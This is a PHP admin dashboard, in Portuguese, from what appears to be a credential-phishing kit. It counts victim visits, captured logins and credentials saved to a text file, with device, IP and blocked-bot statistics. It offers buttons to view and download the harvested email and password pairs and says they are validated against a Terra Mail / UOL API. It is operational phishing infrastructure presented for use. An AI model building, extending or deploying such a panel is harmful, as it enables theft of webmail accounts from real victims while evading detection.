<?php
declare(strict_types=1);

require dirname(__DIR__) . '/includes/panel_init.php';

$config = panel_bootstrap_config();
secure_session_start(true, panel_data_dir($config));
require_admin();

$storage = panel_storage($config);
$stats = $storage->getStats();
$ipList = $storage->getIpAccessList();
$botList = $storage->getBotAccessList();
$flash = (string) ($_SESSION['flash'] ?? '');
$flashError = !empty($_SESSION['flash_error']);
unset($_SESSION['flash'], $_SESSION['flash_error']);

require __DIR__ . '/includes/layout.php';
admin_header('Dashboard', 'dashboard');
?>

<?php if ($flash): ?>
<div class="flash <?= $flashError ? 'flash-error' : 'flash-ok' ?>"><?= e($flash) ?></div>
<?php endif; ?>

<div class="hero-panel">
    <div class="hero-glow" aria-hidden="true"></div>
    <div class="hero-text">
        <span class="hero-badge">Painel ativo</span>
        <h2><?= e(admin_panel_name()) ?></h2>
        <p>
            <span class="hero-chip hero-chip-mail">📧 Ver logins</span>
            <span class="hero-chip hero-chip-dl">⬇ Baixar logins</span>
            <span class="hero-note">E-mail e senha ficam só no console. Validação via API Terra Mail Pessoa FÃ­sica (mailpro.uol.com.br).</span>
        </p>
    </div>
    <button type="button" class="btn-nav-ver-logins btn-hero-logins" id="btn-open-console-hero">
        <span class="btn-mail-icon">📧</span>
        <span>Abrir console de logins</span>
    </button>
</div>

<div class="stats-grid">
    <div class="stat-card stat-visits">
        <span class="stat-icon" aria-hidden="true">👁</span>
        <div class="num"><?= (int) $stats['visits_today'] ?></div>
        <div class="lbl">Visitas hoje</div>
    </div>
    <div class="stat-card stat-visits">
        <span class="stat-icon" aria-hidden="true">📊</span>
        <div class="num"><?= (int) $stats['visits_total'] ?></div>
        <div class="lbl">Visitas total</div>
    </div>
    <div class="stat-card stat-logins">
        <span class="stat-icon" aria-hidden="true">🔐</span>
        <div class="num"><?= (int) $stats['logins_today'] ?></div>
        <div class="lbl">Logins hoje</div>
    </div>
    <div class="stat-card stat-saved">
        <span class="stat-icon" aria-hidden="true">💾</span>
        <div class="num"><?= (int) $stats['unique_credentials'] ?></div>
        <div class="lbl">Salvos (txt)</div>
    </div>
    <div class="stat-card stat-ips">
        <span class="stat-icon" aria-hidden="true">🌐</span>
        <div class="num"><?= (int) $stats['unique_ips'] ?></div>
        <div class="lbl">IPs únicos</div>
    </div>
    <div class="stat-card stat-blocked">
        <span class="stat-icon" aria-hidden="true">🚫</span>
        <div class="num"><?= (int) $stats['blocked_ips'] ?></div>
        <div class="lbl">IPs bloqueados</div>
        <?php if ((int) $stats['blocked_ips'] > 0): ?>
        <form method="post" action="clear_data.php" class="stat-unblock-form panel-action-form" data-confirm="Liberar todos os IPs bloqueados?">
            <?= panel_action_field('clear:blocked_ips') ?>
            <input type="hidden" name="action" value="blocked_ips">
            <input type="hidden" name="redirect" value="index.php">
            <button type="submit" class="btn-unblock-all">Liberar todos</button>
        </form>
        <?php endif; ?>
    </div>
    <div class="stat-card stat-card-bots">
        <span class="stat-icon" aria-hidden="true">🤖</span>
        <div class="num"><?= (int) $stats['bots_today'] ?></div>
        <div class="lbl">Bots bloqueados hoje</div>
        <div class="stat-sub"><?= (int) $stats['bots_total'] ?> total</div>
    </div>
</div>

<div class="device-counters">
    <div class="device-counter device-counter-iphone">
        <span class="device-counter-icon" aria-hidden="true">📱</span>
        <div class="device-counter-body">
            <div class="device-counter-num"><?= (int) $stats['iphone_today'] ?></div>
            <div class="device-counter-lbl">iPhone / iOS hoje</div>
            <div class="device-counter-sub"><?= (int) $stats['iphone_total'] ?> total</div>
        </div>
    </div>
    <div class="device-counter device-counter-android">
        <span class="device-counter-icon" aria-hidden="true">🤖</span>
        <div class="device-counter-body">
            <div class="device-counter-num"><?= (int) $stats['android_today'] ?></div>
            <div class="device-counter-lbl">Android hoje</div>
            <div class="device-counter-sub"><?= (int) $stats['android_total'] ?> total</div>
        </div>
    </div>
    <div class="device-counter device-counter-desktop">
        <span class="device-counter-icon" aria-hidden="true">🖥️</span>
        <div class="device-counter-body">
            <div class="device-counter-num"><?= (int) $stats['desktop_today'] ?></div>
            <div class="device-counter-lbl">Desktop hoje</div>
            <div class="device-counter-sub"><?= (int) $stats['desktop_total'] ?> total</div>
        </div>
    </div>
</div>

<?php require __DIR__ . '/includes/ip_rows.php'; ?>

<script>
document.getElementById('btn-open-console-hero')?.addEventListener('click', function () {
    document.getElementById('btn-open-console')?.click();
});
</script>

<?php admin_footer(); ?>
